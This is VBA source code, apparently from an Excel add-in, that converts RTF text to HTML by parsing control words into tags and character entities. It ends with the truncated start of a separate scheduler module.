        ShiftNext = NextCodes(1)
        For l = 1 To UBound(NextCodes) - 1
            NextCodes(l) = NextCodes(l + 1)
        Next l
        ReDim Preserve NextCodes(UBound(NextCodes) - 1)
    End If
End Function
Function ShiftNextBeg() As String
    'get 1st code off list and shorten list
    Dim l As Long
    
    If UBound(NextCodesBeg) > 0 Then
        ShiftNextBeg = NextCodesBeg(1)
        For l = 1 To UBound(NextCodesBeg) - 1
            NextCodesBeg(l) = NextCodesBeg(l + 1)
        Next l
        ReDim Preserve NextCodesBeg(UBound(NextCodesBeg) - 1)
    End If
End Function


Function ProcessWord(strWord As String)
    Dim strTmp As String
    Dim strTmpbeg As String
    Dim l As Long
    Dim gPopAll As Boolean
    Dim lRetVal As Long
    
    Dim strTableAlign As String    'current table alignment for setting up tablestring
    Dim strTableWidth As String    'current table width for setting up tablestring
    
    If lSkipWords > 0 Then
        lSkipWords = lSkipWords - 1
        Exit Function
    End If
    If (Left(strWord, 1) = "\" Or Left(strWord, 1) = "{" Or Left(strWord, 1) = "}") _
        And (Left(strWord, 2) <> "\\" And Left(strWord, 2) <> "\{" And Left(strWord, 2) <> "\}") Then
        strWord = Trim(strWord)
        'Debug.Print strWord
        
        '        Select Case strWord    '\\ EducatedFool
        '            Case "\intbl"
        '                If InCodes("</div>") Then
        '                    PushNextBeg ("<div>")
        '                    PushNext ("</div>")
        '                    Codes2NextTill "</div>"
        '                    KillCode ("</div>")
        '                Else
        '                    PushNext ("</div>")
        '                    PushNextBeg ("<div>")
        '                End If
        '
        '            Case "\trowd"
        '                Dim strRow$
        '                strRow = "<row>"
        '                If InNext("</row>") Then
        '                    ReplaceInNextBeg "</row>", strRow
        '                ElseIf InCodes("</row>") Then
        '                    PushNext ("</row>")
        '                    PushNextBeg (strRow)
        '                    Codes2NextTill "</row>"
        '                    KillCode ("</row>")
        '                Else
        '                    PushNext ("</row>")
        '                    PushNextBeg (strRow)
        '                End If
        '
        '                '            Case "\row"
        '                '                strSecTmp = "</row>" & strSecTmp
        '
        '            Case "\cell"
        '                'strSecTmp = "----" & strSecTmp
        '                PushNext ("<input/>")
        '
        '        End Select
        
        Select Case Left(strWord, 2)
            Case "}"
                If lBrLev = 0 Then
                    lRetVal = KillCode("*", "G")
                    ClearNext ("</li>")
                    ClearFont
                End If
            Case "\'"    'special characters
                strTmp = HTMLCode(Mid(strWord, 3))
                If Left(strTmp, 6) = "<rtf>:" Then
                    strSecTmp = Mid(strTmp, 7) & " " & strSecTmp
                Else
                    strSecTmp = strTmp & strSecTmp
                End If
            Case "\b"    'bold
                If strWord = "\b" Then
                    If InCodes("</b>", True) Then
                        '                    Codes2NextTill ("</b>")
                    Else
                        PushNext ("</b>")
                        PushNextBeg ("<b>")
                    End If
                ElseIf strWord = "\bullet" Then
                    'If Not (Codes(UBound(Codes)).Code = "</li>" And Codes(UBound(Codes)).Status = "A") Then
                    PushNext ("</li>")
                    PushNextBeg ("<li>")
                    'End If
                ElseIf strWord = "\b0" Then    'bold off
                    If InCodes("</b>") Then
                        Codes2NextTill ("</b>")
                        KillCode ("</b>")
                    End If
                    If InNext("</b>") Then
                        RemoveFromNext ("</b>")
                    End If
                End If
            Case "\c"
                '                If strWord = "\cell" Then
                '                    If InNext("</cell>") Then
                '                        ReplaceInNextBeg "</cell>", "<cell aaa>"
                '                    ElseIf InCodes("</cell>") Then
                '                        PushNext ("</cell>")
                '                        PushNextBeg ("<cell bbb>")
                '                        Codes2NextTill "</cell>"
                '                        KillCode ("</cell>")
                '                    Else
                '                        PushNext ("</cell>")
                '                        PushNextBeg ("<cell ccc>")
                '                    End If
                '                End If
                
                If strWord = "\cf0" Then    'color font off
                    strFontColor = ""
                    strFont = ParseFont(strFontColor, strFontSize, strFace)
                ElseIf Left(strWord, 3) = "\cf" And IsNumeric(Mid(strWord, 4)) Then  'color font
                    'get color code
                    l = Val(Mid(strWord, 4))
                    If l <= UBound(strColorTable) And l > 0 Then
                        strFontColor = "#" & strColorTable(l)
                    End If
                    
                    'insert color
                    If strFontColor <> "#" Then
                        strFont = ParseFont(strFontColor, strFontSize, strFace)
                        If InNext("</font>") Then
                            ReplaceInNextBeg "</font>", strFont
                        ElseIf InCodes("</font>") Then
                            PushNext ("</font>")
                            PushNextBeg (strFont)
                            Codes2NextTill "</font>"
                            KillCode ("</font>")
                        Else
                            PushNext ("</font>")
                            PushNextBeg (strFont)
                        End If
                    End If
                End If
            Case "\f"
                If Left(strWord, 3) = "\fs" And IsNumeric(Mid(strWord, 4)) Then  'font size
                    l = Val(Mid(strWord, 4))
                    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 29.10.2019
                    '                    lFontSize = Int((l / 7) - 0)    'calc to convert RTF to HTML sizes
                    '                    If lFontSize > 8 Then lFontSize = 8
                    '                    If lFontSize < 1 Then lFontSize = 1
                    lFontSize = l
                    strFontSize = Trim(lFontSize)
                    If Val(strFontSize) = iDefFontSize Then strFontSize = ""
                    'insert size
                    strFont = ParseFont(strFontColor, strFontSize, strFace)
                ElseIf Left(strWord, 2) = "\f" And IsNumeric(Mid(strWord, 3)) And gUseFontFace Then  'font type
                    strFace = strFontTable(Val(Mid(strWord, 3)))
                    strFont = ParseFont(strFontColor, strFontSize, strFace)
                End If
                
            Case "\i"
                If strWord = "\i" Then    'italics
                    If InCodes("</i>", True) Then
                        '                    Codes2NextTill ("</i>")
                    Else
                        PushNext ("</i>")
                        PushNextBeg ("<i>")
                    End If
                ElseIf strWord = "\i0" Then    'italics off
                    If InCodes("</i>") Then
                        Codes2NextTill ("</i>")
                        KillCode ("</i>")
                    End If
                    If InNext("</i>") Then
                        RemoveFromNext ("</i>")
                    End If
                End If
                
            Case "\l"
                'If strWord = "\listname" Then
                '    lSkipWords = 1
                'End If
            Case "\n"
                If strWord = "\nosupersub" Then    'superscript/subscript off
                    If InCodes("</sub>", True) Then
                        Codes2NextTill ("</sub>")
                        KillCode ("</sub>")
                    End If
                    If InNext("</sub>") Then
                        RemoveFromNext ("</sub>")
                    End If
                    If InCodes("</sup>", True) Then
                        Codes2NextTill ("</sup>")
                        KillCode ("</sup>")
                    End If
                    If InNext("</sup>") Then
                        RemoveFromNext ("</sup>")
                    End If
                End If
            Case "\p"
                If strWord = "\par" Then
                    If Not (InCodes("</ul>") Or InCodes("</li>")) Then
                        strBeforeText2 = strBeforeText2 & strEOL & "<br>" & strCR
                    Else
                        lRetVal = KillCode("</li>")
                        RemoveFromNext ("</li>")
                    End If
                    gBOL = True
                    gPar = True
                    'If InCodes("</ul>") Then
                    '    PushNext ("</li>")
                    '    PushNextBeg ("<li>")
                    'End If
                ElseIf strWord = "\pard" Then
                    For l = 1 To UBound(CodesBeg)
                        If Codes(l).Status = "G" Or Codes(l).Status = "PG" Then
                            Codes(l).Status = "K"
                            CodesBeg(l).Status = "K"
                        End If
                    Next l
                    If Not gIgnorePard Then
                        If InCodes("</li>") Then
                            lRetVal = KillCode("</li>")
                            RemoveFromNext ("</li>")
                        End If
                    End If
                    gPar = True
                ElseIf strWord = "\plain" Then
                    lRetVal = KillCode("*", "G")
                    ClearFont
                ElseIf strWord = "\pnlvlblt" Then    'bulleted list
                    If Not InNext("</li>") Then
                        PushNext ("</li>")
                        PushNextBeg ("<li>")
                    End If
                    'PushNext ("</ul>")
                    'PushNextBeg ("<ul>")
                ElseIf strWord = "\pntxta" Then    'numbered list?
                    lSkipWords = 1
                ElseIf strWord = "\pntxtb" Then    'numbered list?
                    lSkipWords = 1
                ElseIf strWord = "\pntext" Then    'bullet
                    If Not InNext("</li>") Then
                        PushNext ("</li>")
                        PushNextBeg ("<li>")
                        Codes2NextTill ("</table>")
                        KillCode ("*")
                    End If
                End If
            Case "\q"
                If strWord = "\qc" Then    'centered
                    strTableAlign = "center"
                    strTableWidth = "100%"
                    If InNext("</td></tr></table>") Then
                        '?
                    Else
                        strTable = "<table width=" & strTableWidth & "><tr><td align=""" & strTableAlign & """>"
                    End If
                    If InNext("</td></tr></table>") Then
                        ReplaceInNextBeg "</td></tr></table>", strTable
                    ElseIf InCodes("</td></tr></table>") Then
                        PushNext ("</td></tr></table>")
                        PushNextBeg (strTable)
                        Codes2NextTill "</td></tr></table>"
                    Else
                        PushNext ("</td></tr></table>")
                        PushNextBeg (strTable)
                    End If
                ElseIf strWord = "\qr" Then    'right justified
                    strTableAlign = "right"
                    strTableWidth = "100%"
                    If InNext("</td></tr></table>") Then
                        '?
                    Else
                        strTable = "<table width=" & strTableWidth & "><tr><td align=""" & strTableAlign & """>"
                    End If
                    If InNext("</td></tr></table>") Then
                        ReplaceInNextBeg "</td></tr></table>", strTable
                    ElseIf InCodes("</td></tr></table>") Then
                        PushNext ("</td></tr></table>")
                        PushNextBeg (strTable)
                        Codes2NextTill "</td></tr></table>"
                    Else
                        PushNext ("</td></tr></table>")
                        PushNextBeg (strTable)
                    End If
                End If
            Case "\s"
                If strWord = "\strike" Then    'strike text
                    If Codes(UBound(Codes)).code <> "</s>" Or (Codes(UBound(Codes)).code = "</s>" And CodesBeg(UBound(Codes)).code = "") Then
                        PushNext ("</s>")
                        PushNextBeg ("<s>")
                    End If
                ElseIf strWord = "\strike0" Then    'strike off
                    If InCodes("</s>") Then
                        Codes2NextTill ("</s>")
                        KillCode ("</s>")
                    End If
                    If InNext("</s>") Then
                        RemoveFromNext ("</s>")
                    End If
                ElseIf strWord = "\super" Then    'superscript
                    If Codes(UBound(Codes)).code <> "</sup>" Or (Codes(UBound(Codes)).code = "</sup>" And CodesBeg(UBound(Codes)).code = "") Then
                        PushNext ("</sup>")
                        PushNextBeg ("<sup>")
                    End If
                ElseIf strWord = "\sub" Then    'subscript
                    If Codes(UBound(Codes)).code <> "</sub>" Or (Codes(UBound(Codes)).code = "</sub>" And CodesBeg(UBound(Codes)).code = "") Then
                        PushNext ("</sub>")
                        PushNextBeg ("<sub>")
                    End If
                End If
                
                'If strWord = "\snext0" Then    'style
                '    lSkipWords = 1
                'End If
            Case "\t"
                If strWord = "\tab" Then    'tab
                    strSecTmp = vbTab & strSecTmp
                End If
            Case "\u"
                If strWord = "\ul" Then    'underline
                    If InCodes("</u>", True) Then
                        '                    Codes2NextTill ("</u>")
                    Else
                        PushNext ("</u>")
                        PushNextBeg ("<u>")
                    End If
                ElseIf strWord = "\ulnone" Then    'stop underline
                    If InCodes("</u>") Then
                        Codes2NextTill ("</u>")
                        KillCode ("</u>")
                    End If
                    If InNext("</u>") Then
                        RemoveFromNext ("</u>")
                    End If
                    '                ElseIf strWord Like "\u#*#" Then
                    '                    strSecTmp = ChrW(Val(Mid(strWord, 3))) & strSecTmp
                End If
        End Select
    Else
        If Len(strWord) > 0 Then
            If strWord = "\\" Or strWord = "\{" Or strWord = "\}" Then strWord = Right(strWord, 1)
            If Trim(strWord) = "" Then
                'If gBOL Then strWord = rtf2html_replace(strWord, " ", "&nbsp;")
                strCurPhrase = strCurPhrase & strBeforeText3 & strWord
            Else
                'regular text
                If gPar Then
                    strBeforeText = strBeforeText & ProcessAfterTextCodes
                    Next2Codes
                    strBeforeText3 = GetAllCodesBeg
                    gPar = False
                Else
                    strBeforeText = strBeforeText & ProcessAfterTextCodes
                    Next2Codes
                    strBeforeText3 = GetAllCodesBegTill("</td></tr></table>")
                End If
                RemoveBlanks
                
                strCurPhrase = strCurPhrase & strBeforeText
                strBeforeText = ""
                strCurPhrase = strCurPhrase & strBeforeText2
                strBeforeText2 = ""
                strCurPhrase = strCurPhrase & strBeforeText3 & strWord
                strBeforeText3 = ""
                gBOL = False
            End If
        End If
    End If
End Function

Function PushNext(strCode As String)
    If Len(strCode) > 0 Then
        ReDim Preserve NextCodes(UBound(NextCodes) + 1)
        NextCodes(UBound(NextCodes)) = strCode
    End If
End Function

Function UnShiftNext(strCode As String)
    'stick strCode on front of list and move everything over to make room
    Dim l As Long
    
    If Len(strCode) > 0 Then
        ReDim Preserve NextCodes(UBound(NextCodes) + 1)
        If UBound(NextCodes) > 1 Then
            For l = UBound(NextCodes) To 1 Step -1
                NextCodes(l) = NextCodes(l - 1)
            Next l
        End If
        NextCodes(1) = strCode
    End If
End Function

Function UnShiftNextBeg(strCode As String)
    Dim l As Long
    
    If Len(strCode) > 0 Then
        ReDim Preserve NextCodesBeg(UBound(NextCodesBeg) + 1)
        If UBound(NextCodesBeg) > 1 Then
            For l = UBound(NextCodesBeg) To 1 Step -1
                NextCodesBeg(l) = NextCodesBeg(l - 1)
            Next l
        End If
        NextCodesBeg(1) = strCode
    End If
End Function

Function PushNextBeg(strCode As String)
    ReDim Preserve NextCodesBeg(UBound(NextCodesBeg) + 1)
    NextCodesBeg(UBound(NextCodesBeg)) = strCode
End Function


Function RemoveBlanks()
    Dim l As Long
    Dim lOffSet As Long
    
    l = 1
    lOffSet = 0
    While l <= UBound(CodesBeg) And l + lOffSet <= UBound(CodesBeg)
        If CodesBeg(l).Status = "K" Or CodesBeg(l).Status = "" Then     'And Not (Codes(l) = "</font>" And Len(strFont) > 0) Then
            lOffSet = lOffSet + 1
        Else
            l = l + 1
        End If
        If l + lOffSet <= UBound(CodesBeg) Then
            Codes(l) = Codes(l + lOffSet)
            CodesBeg(l) = CodesBeg(l + lOffSet)
        End If
    Wend
    If lOffSet > 0 Then
        ReDim Preserve Codes(UBound(Codes) - lOffSet)
        ReDim Preserve CodesBeg(UBound(CodesBeg) - lOffSet)
    End If
End Function

Function RemoveFromNext(strRem As String)
    Dim l As Long
    Dim m As Long
    
    If UBound(NextCodes) < 1 Then GoTo finally
    l = 1
    While l < UBound(NextCodes)
        If NextCodes(l) = strRem Then
            For m = l To UBound(NextCodes) - 1
                NextCodes(m) = NextCodes(m + 1)
                NextCodesBeg(m) = NextCodesBeg(m + 1)
            Next m
            l = m
        Else
            l = l + 1
        End If
    Wend
    ReDim Preserve NextCodes(UBound(NextCodes) - 1)
    ReDim Preserve NextCodesBeg(UBound(NextCodesBeg) - 1)
finally:
End Function

Function rtf2html_replace(ByVal strIn As String, ByVal strRepl As String, ByVal strWith As String) As String
    'replace all instances of strRepl in strIn with strWith
    Dim i As Integer
    
    If ((Len(strRepl) = 0) Or (Len(strIn) = 0)) Then
        rtf2html_replace = strIn
        Exit Function
    End If
    i = InStr(strIn, strRepl)
    While i <> 0
        strIn = Left(strIn, i - 1) & strWith & Mid(strIn, i + Len(strRepl))
        i = InStr(i + Len(strWith), strIn, strRepl)
    Wend
    rtf2html_replace = strIn
End Function

Function ReviveCode(strCode As String)
    Dim l As Long
    
    For l = 1 To UBound(Codes)
        If Codes(l).code = strCode Then
            Codes(l).Status = "A"
            CodesBeg(l).Status = "A"
        End If
    Next l
End Function

Function ReplaceInNextBeg(strCode As String, strWith As String) As Long
    Dim l As Long
    Dim lCount As Long    'number of codes replaced
    
    lCount = 0
    For l = 1 To UBound(NextCodes)
        If NextCodes(l) = strCode Then
            NextCodesBeg(l) = strWith
            lCount = lCount + 1
        End If
    Next l
    ReplaceInNextBeg = lCount
End Function

Function ReplaceInCodesBeg(strCode As String, strWith As String)
    Dim l As Long
    
    l = 1
    While l <= UBound(Codes) And Codes(l).code <> strCode
        l = l + 1
    Wend
    If Codes(l).code = strCode Then
        If CodesBeg(l).code <> strWith Then
            CodesBeg(l).code = strWith
            Codes(l).Status = "P"
            CodesBeg(l).Status = "P"
        Else
            Codes(l).Status = "P"
            CodesBeg(l).Status = "P"
        End If
    End If
End Function

Function rtf2html(strRTF As String) As String    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    Dim prefix$, suffix$
    'prefix$ = "<html><head></head><body style='background-color: #7f9; text-shadow: 1px 1px 1px #bbb;'>"
    prefix$ = "<html><head></head><body style='background-color: #afc; zoom: 50%;'>"
    suffix$ = "</body></html>"
    rtf2html = prefix$ & rtf2html3(strRTF) & suffix$
End Function


Function rtf2html3(strRTF As String, Optional strOptions As String) As String
    On Error Resume Next
    'Options:
    '+H              add an HTML header and footer
    '+G              add a generator Metatag
    '+T="MyTitle"    add a title (only works if +H is used)
    '+CR             add a carraige return after all <br>s
    '+I              keep html codes intact
    '+F=X            default font size (blanks out any changes to this size - saves on space)
    '-FF             ignore font faces
    
    Dim strHTML As String
    Dim strRTFTmp As String
    Dim l As Long
    Dim lTmp As Long
    Dim lTmp2 As Long
    Dim lTmp3 As Long
    Dim lRTFLen As Long
    Dim lBOS As Long                 'beginning of section
    Dim lEOS As Long                 'end of section
    Dim strTmp As String
    Dim strTmp2 As String
    Dim strEOS As String             'string to be added to end of section
    Dim strBOS As String             'string to be added to beginning of section
    Dim strEOP As String             'string to be added to end of paragraph
    Dim strBOL As String             'string to be added to the begining of each new line
    Dim strEOL As String             'string to be added to the end of each new line
    Dim strEOLL As String            'string to be added to the end of previous line
    Const gHellFrozenOver = False    'always false
    Dim gSkip As Boolean             'skip to next word/command
    Dim strCodes As String           'codes for ascii to HTML char conversion
    Dim strCurLine As String         'temp storage for text for current line before being added to strHTML
    Dim strFontCodes As String       'list of font code modifiers
    Dim gSeekingText As Boolean      'True if we have to hit text before inserting a </FONT>
    Dim gText As Boolean             'true if there is text (as opposed to a control code) in strTmp
    Dim strAlign As String           '"center" or "right"
    Dim gAlign As Boolean            'if current text is aligned
    Dim strGen As String             'Temp store for Generator Meta Tag if requested
    Dim strTitle As String           'Temp store for Title if requested
    Dim gHTML As Boolean             'true if html codes should be left intact
    Dim strWordTmp As String         'temporary word buffer
    Dim strEndText As String         'ending text
    Dim strLastWord As String        'previous "word"
    
    ClearCodes
    strHTML = ""
    gPlain = False
    gBOL = True
    gPar = False
    strCurPhrase = ""
    
    'setup +CR option
    If InStr(strOptions, "+CR") <> 0 Then strCR = vbCrLf Else strCR = ""
    'setup +HTML option
    If InStr(strOptions, "+I") <> 0 Then gHTML = True Else gHTML = False
    'setup default font size option
    If InStr(strOptions, "+F=") <> 0 Then
        l = InStr(strOptions, "+F=") + 3
        strTmp = Mid(strOptions, l, 1)
        iDefFontSize = 0
        While IsDig(strTmp)
            iDefFontSize = iDefFontSize * 10 + Val(strTmp)
            l = l + 1
            strTmp = Mid(strOptions, l, 1)
        Wend
    End If
    'setup to use different fonts or not
    If InStr(strOptions, "-FF") <> 0 Then gUseFontFace = False Else gUseFontFace = True
    
    strRTFTmp = TrimAll(strRTF)
    
    If Left(strRTFTmp, 1) = "{" And Right(strRTFTmp, 1) = "}" Then strRTFTmp = Mid(strRTFTmp, 2, Len(strRTFTmp) - 2)
    
    'setup list (bullets) status
    If InStr(strRTFTmp, "\list\") <> 0 Then
        'I'm not sure if this is in any way correct but it seems to work for me
        'sometimes \pard ends a list item sometimes it doesn't
        gIgnorePard = True
    Else
        gIgnorePard = False
    End If
    
    'setup color table
    lBOS = InStr(strRTFTmp, "\colortbl")
    If lBOS > 0 Then
        strSecTmp = NabSection(strRTFTmp, lBOS)
        GetColorTable strSecTmp, strColorTable()
    End If
    
    'setup font table
    lBOS = InStr(strRTFTmp, "\fonttbl")
    If lBOS > 0 Then
        strSecTmp = NabSection(strRTFTmp, lBOS)
        GetFontTable strSecTmp, strFontTable()
    End If
    
    'setup stylesheets
    lBOS = InStr(strRTFTmp, "\stylesheet")
    If lBOS > 0 Then
        strSecTmp = NabSection(strRTFTmp, lBOS)
        'ignore stylesheets for now
    End If
    
    'setup info
    lBOS = InStr(strRTFTmp, "\info")
    If lBOS > 0 Then
        strSecTmp = NabSection(strRTFTmp, lBOS)
        'ignore info for now
    End If
    
    'list table
    lBOS = InStr(strRTFTmp, "\listtable")
    If lBOS > 0 Then
        strSecTmp = NabSection(strRTFTmp, lBOS)
        'ignore info for now
    End If
    
    'list override table
    lBOS = InStr(strRTFTmp, "\listoverridetable")
    If lBOS > 0 Then
        strSecTmp = NabSection(strRTFTmp, lBOS)
        'ignore info for now
    End If
    
    lBrLev = 0
    strLastWord = ""
    While Len(strRTFTmp) > 0
        strSecTmp = NabNextLine(strRTFTmp)
        While Len(strSecTmp) > 0
            strLastWord = strWordTmp
            strWordTmp = NabNextWord(strSecTmp)
            If lBrLev > 0 Then
                If strWordTmp = "{" Then
                    lBrLev = lBrLev + 1
                ElseIf strWordTmp = "}" Then
                    lBrLev = lBrLev - 1
                End If
                strWordTmp = ""
            ElseIf strWordTmp = "\*" Or strWordTmp = "\pict" Then
                'skip \pnlvlbt stuff
                lBrLev = 1
                strWordTmp = ""
            ElseIf strWordTmp = "\pntext" Then
                'get bullet codes but skip rest for now
                lBrLev = 1
            End If
            If Len(strWordTmp) > 0 Then
                'If gDebug Then ShowCodes (strWordTmp)  'for debugging only
                If Len(strWordTmp) > 0 Then ProcessWord strWordTmp
            End If
        Wend
    Wend
    
    'get any remaining codes in stack
    strEndText = strEndText & GetActiveCodes
    strBeforeText2 = rtf2html_replace(strBeforeText2, "<br>", "")
    strBeforeText2 = rtf2html_replace(strBeforeText2, vbCrLf, "")
    strCurPhrase = strCurPhrase & strBeforeText & strBeforeText2 & strEndText
    strBeforeText = ""
    strBeforeText2 = ""
    strBeforeText3 = ""
    strHTML = strHTML & strCurPhrase
    strCurPhrase = ""
    ClearFont
    rtf2html3 = strHTML
End Function

Function IsDig(strChar As String) As Boolean
    If Len(strChar) = 0 Then
        IsDig = False
    Else
        IsDig = InStr("1234567890", strChar)
    End If
End Function

Function GetCodes(strWordTmp As String) As String
    Dim strTmp As String
    Dim l As Long
    
    strTmp = "CurWord: "
    If Len(strWordTmp) > 20 Then
        strTmp = strTmp & Left(strWordTmp, 20) & "..."
    Else
        strTmp = strTmp & strWordTmp
    End If
    strTmp = strTmp & vbCrLf & vbCrLf & "BegCodes: "
    For l = 1 To UBound(CodesBeg)
        strTmp = strTmp & CodesBeg(l).code & " (" & CodesBeg(l).Status & "), "
    Next l
    strTmp = strTmp & vbCrLf & "Codes: "
    For l = 1 To UBound(Codes)
        strTmp = strTmp & Codes(l).code & " (" & Codes(l).Status & "), "
    Next l
    strTmp = strTmp & vbCrLf & vbCrLf & "NextBegCodes: "
    For l = 1 To UBound(NextCodesBeg)
        strTmp = strTmp & NextCodesBeg(l) & ", "
    Next l
    strTmp = strTmp & vbCrLf & "NextCodes: "
    For l = 1 To UBound(NextCodes)
        strTmp = strTmp & NextCodes(l) & ", "
    Next l
    strTmp = strTmp & vbCrLf & vbCrLf & "Font String: " & strFont
    strTmp = strTmp & vbCrLf & vbCrLf & "Before Text: " & strBeforeText2
    GetCodes = strTmp
End Function

Function TrimAll(ByVal strTmp As String) As String
    Dim l As Long
    
    strTmp = Trim(strTmp)
    l = Len(strTmp) + 1
    While l <> Len(strTmp)
        l = Len(strTmp)
        If Right(strTmp, 1) = vbCrLf Then strTmp = Left(strTmp, Len(strTmp) - 1)
        If Left(strTmp, 1) = vbCrLf Then strTmp = Right(strTmp, Len(strTmp) - 1)
        If Right(strTmp, 1) = vbCr Then strTmp = Left(strTmp, Len(strTmp) - 1)
        If Left(strTmp, 1) = vbCr Then strTmp = Right(strTmp, Len(strTmp) - 1)
        If Right(strTmp, 1) = vbLf Then strTmp = Left(strTmp, Len(strTmp) - 1)
        If Left(strTmp, 1) = vbLf Then strTmp = Right(strTmp, Len(strTmp) - 1)
    Wend
    TrimAll = strTmp
End Function

Function HTMLCode(strRTFCode As String) As String
    'given rtf code return html code
    On Error Resume Next
    Select Case strRTFCode
        Case "00"
            HTMLCode = "&nbsp;"
        Case "a9"
            HTMLCode = "&copy;"
        Case "b4"
            HTMLCode = "&acute;"
        Case "ab"
            HTMLCode = "&laquo;"
        Case "bb"
            HTMLCode = "&raquo;"
        Case "a1"
            HTMLCode = "&iexcl;"
        Case "bf"
            HTMLCode = "&iquest;"
        Case "c0"
            HTMLCode = "&Agrave;"
        Case "e0"
            HTMLCode = "&agrave;"
        Case "c1"
            HTMLCode = "&Aacute;"
        Case "e1"
            HTMLCode = "&aacute;"
        Case "c2"
            HTMLCode = "&Acirc;"
        Case "e2"
            HTMLCode = "&acirc;"
        Case "c3"
            HTMLCode = "&Atilde;"
        Case "e3"
            HTMLCode = "&atilde;"
        Case "c4"
            HTMLCode = "&Auml;"
        Case "e4", "99"
            HTMLCode = "<rtf>:\super TM\nosupersub"
        Case "c5"
            HTMLCode = "&Aring;"
        Case "e5"
            HTMLCode = "&aring;"
        Case "c6"
            HTMLCode = "&AElig;"
        Case "e6"
            HTMLCode = "&aelig;"
        Case "c7"
            HTMLCode = "&Ccedil;"
        Case "e7"
            HTMLCode = "&ccedil;"
        Case "d0"
            HTMLCode = "&ETH;"
        Case "f0"
            HTMLCode = "&eth;"
        Case "c8"
            HTMLCode = "&Egrave;"
        Case "e8"
            HTMLCode = "&egrave;"
        Case "c9"
            HTMLCode = "&Eacute;"
        Case "e9"
            HTMLCode = "&eacute;"
        Case "ca"
            HTMLCode = "&Ecirc;"
        Case "ea"
            HTMLCode = "&ecirc;"
        Case "cb"
            HTMLCode = "&Euml;"
        Case "eb"
            HTMLCode = "&euml;"
        Case "cc"
            HTMLCode = "&Igrave;"
        Case "ec"
            HTMLCode = "&igrave;"
        Case "cd"
            HTMLCode = "&Iacute;"
        Case "ed"
            HTMLCode = "&iacute;"    '|fffd|
        Case "ce"
            HTMLCode = "&Icirc;"
        Case "ee"
            HTMLCode = "&icirc;"
        Case "cf"
            HTMLCode = "&Iuml;"
        Case "ef"
            HTMLCode = "&iuml;"
        Case "d1"
            HTMLCode = "&Ntilde;"
        Case "f1"
            HTMLCode = "&ntilde;"
        Case "d2"
            HTMLCode = "&Ograve;"
        Case "f2"
            HTMLCode = "&ograve;"
        Case "d3"
            HTMLCode = "&Oacute;"
        Case "f3"
            HTMLCode = "&oacute;"
        Case "d4"
            HTMLCode = "&Ocirc;"
        Case "f4"
            HTMLCode = "&ocirc;"
        Case "d5"
            HTMLCode = "&Otilde;"
        Case "f5"
            HTMLCode = "&otilde;"
        Case "d6"
            HTMLCode = "&Ouml;"
        Case "f6"
            HTMLCode = "&ouml;"
        Case "d8"
            HTMLCode = "&Oslash;"
        Case "f8"
            HTMLCode = "&oslash;"
        Case "d9"
            HTMLCode = "&Ugrave;"
        Case "f9"
            HTMLCode = "&ugrave;"
        Case "da"
            HTMLCode = "&Uacute;"
        Case "fa"
            HTMLCode = "&uacute;"
        Case "db"
            HTMLCode = "&Ucirc;"
        Case "fb"
            HTMLCode = "&ucirc;"
        Case "dc"
            HTMLCode = "&Uuml;"
        Case "fc"
            HTMLCode = "&uuml;"
        Case "dd"
            HTMLCode = "&Yacute;"
        Case "fd"
            HTMLCode = "&yacute;"
        Case "ff"
            HTMLCode = "&yuml;"
        Case "de"
            HTMLCode = "&THORN;"
        Case "fe"
            HTMLCode = "&thorn;"
        Case "df"
            HTMLCode = "&szlig;"
        Case "a7"
            HTMLCode = "&sect;"
        Case "b6"
            HTMLCode = "&para;"
        Case "b5"
            HTMLCode = "&micro;"
        Case "a6"
            HTMLCode = "&brvbar;"
        Case "b1"
            HTMLCode = "&plusmn;"
        Case "b7"
            HTMLCode = "&middot;"
        Case "a8"
            HTMLCode = "&uml;"
        Case "b8"
            HTMLCode = "&cedil;"
        Case "aa"
            HTMLCode = "&ordf;"
        Case "ba"
            HTMLCode = "&ordm;"
        Case "ac"
            HTMLCode = "&not;"
        Case "ad"
            HTMLCode = "&shy;"
        Case "af"
            HTMLCode = "&macr;"
        Case "b0"
            HTMLCode = "&deg;"
        Case "b9"
            HTMLCode = "&sup1;"
        Case "b2"
            HTMLCode = "&sup2;"
        Case "b3"
            HTMLCode = "&sup3;"
        Case "bc"
            HTMLCode = "&frac14;"
        Case "bd"
            HTMLCode = "&frac12;"
        Case "be"
            HTMLCode = "&frac34;"
        Case "d7"
            HTMLCode = "&times;"
        Case "f7"
            HTMLCode = "&divide;"
        Case "a2"
            HTMLCode = "&cent;"
        Case "a3"
            HTMLCode = "&pound;"
        Case "a4"
            HTMLCode = "&curren;"
        Case "a5"
            HTMLCode = "&yen;"
        Case "85"
            HTMLCode = "..."
        Case "9e"
            HTMLCode = "|fffd|"    '|fffd|
        Case "9a"
            HTMLCode = "|fffd|"    '|fffd|
        Case Else
            If Val("&h" & strRTFCode) > 255 Then
                HTMLCode = ChrW(Val("&h" & strRTFCode))
            Else
                HTMLCode = Chr(Val("&h" & strRTFCode))
            End If
    End Select
End Function

Function TrimifCmd(ByVal strTmp As String) As String
    Dim l As Long
    
    l = 1
    While Mid(strTmp, l, 1) = " "
        l = l + 1
    Wend
    If Mid(strTmp, l, 1) = "\" Or Mid(strTmp, l, 1) = "{" Then
        strTmp = Trim(strTmp)
    Else
        If Left(strTmp, 1) = " " Then strTmp = Mid(strTmp, 2)
        strTmp = RTrim(strTmp)
    End If
    TrimifCmd = strTmp
End Function




Attribute VB_Name = "mod_Scheduler"
'---------------------------------------------------------------------------------------
' Module        : modScheduler                    Version: 1
' Author        : Igor Vakhnenko                   Date: 23.05.2016
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Explicit: Option Compare Text: Option Private Module

Sub ParserScheduler(Optional ByVal TaskName$)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    Dim st As ScheduledTask, Wbname$, WB As Workbook, ST_Err&, errmsg$, ShowMsg As Boolean
    ShowMsg = True: If ParserVariables.Exists("HideParserSchedulerNotifications") Then ShowMsg = Val(ParserVariables.item("HideParserSchedulerNotifications")) = 0

